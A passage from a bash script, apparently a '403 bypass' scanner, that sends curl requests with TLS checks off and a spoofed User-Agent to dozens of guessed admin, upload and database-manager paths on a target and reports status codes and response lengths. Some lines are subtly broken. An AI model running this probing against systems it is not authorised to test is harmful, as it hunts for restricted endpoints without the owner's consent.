         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print


}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
